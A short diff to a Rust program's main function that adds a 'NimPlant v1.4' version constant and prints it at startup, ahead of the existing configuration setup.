@@ -24,7 +24,12 @@ use crate::app::config::Config;
 use crate::app::debug::debug_println;
 use rand::Rng;
 
+pub const VERSION: &str = "NimPlant v1.4";
+
 pub fn main() {
+    // Print the version header
+    println!("{VERSION}");
+
     // Create a new Config object
     let config = Config::new().unwrap_or_else(|_e| {
         debug_println!("Failed to initialize config: {_e}");
